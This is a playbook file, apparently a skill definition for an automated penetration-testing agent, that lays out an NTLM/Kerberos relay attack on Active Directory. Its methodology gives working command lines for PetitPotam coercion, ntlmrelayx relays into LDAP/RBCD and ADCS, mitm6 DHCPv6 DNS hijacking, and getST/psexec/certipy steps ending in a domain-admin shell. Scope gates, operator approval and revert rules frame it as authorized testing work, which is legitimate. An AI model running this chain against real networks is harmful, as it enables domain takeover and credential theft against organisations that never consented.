---
name: attack-relay
description: NTLM / Kerberos relay from a controlled host — ntlmrelayx + a coerce primitive (PetitPotam / PrinterBug / DFSCoerce / ShadowCoerce) OR mitm6-driven DHCPv6 — to relay a privileged account's authn into LDAP (RBCD), SMB, HTTP (ADCS web enrollment), or MSSQL. Lives behind an in-scope LAN foothold.
category: post-foothold
tags: [ntlm-relay, kerberos-relay, mitm6, petitpotam, rbcd, coerce]
cwe_ids: [CWE-287, CWE-294, CWE-306]
chains_with: [attack-adcs, attack-ad-recon, attack-kerberos, attack-lateral]
tools: [impacket, mitm6, bloodyAD, leash-foothold.sh, guard.py]
version: "1.0"
---

# NTLM / Kerberos relay (in-scope LAN only)

## Objective
Convert an outbound-authn primitive (a server willing to be coerced into authenticating to us) into
an authenticated action against a target service, without ever knowing the account's cleartext.
Classic path from a weak LAN foothold to **Domain Controller + ADCS → admin:<domain>**. ATT&CK T1557.

## Gate — this is the LOUDEST and most LAN-specific stage, read carefully
- `stage: post-foothold`
- `requires: ["shell:<lan-foothold-host>"]` — we need a host inside the scope subnet so our listener
  is reachable by the coerce victim; LAN broadcast via mitm6 happens on **that host**, not on the
  operator box.
- `scope.yaml` **must list the LAN segment as `netblocks` or the DC/CA/MSSQL hosts explicitly**;
  mitm6/ntlmrelayx NEVER broadcast to a segment that is not in scope.
- Operator GO required — relay/mitm6 generates substantial LAN traffic and WILL be noticed by SOC
  (program promises "боевое реагирование").

## Methodology

### 1. Pick a coerce primitive
- `PetitPotam` — EFSRPC on `[MS-EFSR]`; patched variously since 2021.
- `PrinterBug` (SpoolSample) — spoolsv RPC `RpcRemoteFindFirstPrinterChangeNotification`.
- `DFSCoerce` — MS-DFSNM.
- `ShadowCoerce` — MS-FSRVP.
Impacket includes `petitpotam.py` / `coercer`; test which responds unauth on `<DC-IP>`.

### 2. Choose relay target
- **LDAP + RBCD on a victim DC** (ntlmrelayx `--delegate-access`): adds attacker-controlled computer
  as msDS-AllowedToActOnBehalfOfOtherIdentity on the victim → `getST.py` → shell as DA.
- **HTTP + ADCS web enrollment** (ESC8, see adcs skill): `--adcs --template DomainController`.
- **SMB** on an unsigned fileshare: `--target smb://<fileserver>`, run `-c <cmd>` on landing.
- **MSSQL** on an unsigned server (xp_cmdshell).

### 3. Run the chain
Terminal A — listener on the LAN foothold (reached via leash-foothold):
```bash
bin/.pyenv/Scripts/ntlmrelayx.py \
  -t ldap://<DC-IP> --delegate-access --no-dump --no-da --escalate-user '<attacker-computer>$' \
  -smb2support -of targets/<t>/raw/attack-relay/relay.log
```
Terminal B — coerce victim DC to authn to us:
```bash
bin/.pyenv/Scripts/petitpotam.py -u '<user>' -p '<pwd>' <lan-foothold-ip> <DC-IP>
```
IPv6/mitm6 variant:
```bash
# Hijack DNS via DHCPv6 on the LAN foothold host (operator-authorized segment only):
bin/.pyenv/Scripts/mitm6 -d <dom> --host-allowlist <in-scope-hosts.txt>
# While ntlmrelayx -6 -wh wpad.<dom> -t ... runs on the same host
```
`--host-allowlist` is the scope cage — populate from `scope.yaml:hosts`.

### 4. Use the relayed capability
RBCD → `getST.py -spn cifs/<DC-FQDN> -impersonate Administrator '<DOM>/<attacker-comp>$'` →
`KRB5CCNAME=... psexec.py -k -no-pass '<DOM>/<DC>'`.

ADCS → `certipy auth -pfx <relay.pfx>` → `nxc smb <DC> -k --use-kcache` returning `Pwn3d!`.

## Oracle
- `relay.log` shows the authn succeeded for a privileged principal (`[+] Attempting to authenticate as <DOM>\\<account>`).
- The relayed capability (RBCD computer / ADCS cert / SMB shell) **oracle-proves** by running an
  authenticated action against the target service (ldap enum / cert auth / `whoami` on the SMB host).
- `shell:<DC>` or `admin:<domain>` enters `capabilities[]` ONLY on this proof.

## Forbidden
- NEVER run mitm6 or ntlmrelayx on a subnet not listed in `scope.yaml`; the host-allowlist file
  is the hard interlock.
- NEVER leave `msDS-AllowedToActOnBehalfOfOtherIdentity` on a legitimate account after the proof —
  revert on same engagement day.
- No relay chains that reach into client/partner tenants (ADFS federation targets can span orgs —
  pre-check with `guard.py --check <relay-target>`).

## Chaining
- `admin:<domain>` ← relay+coerce chain ↔ feeds `attack-privesc` and `attack-backup-pivot`.
- `creds:<svc>@<dom>` ← SMB-relay with xp_cmdshell / cmd-exec ↔ feeds `attack-lateral`.
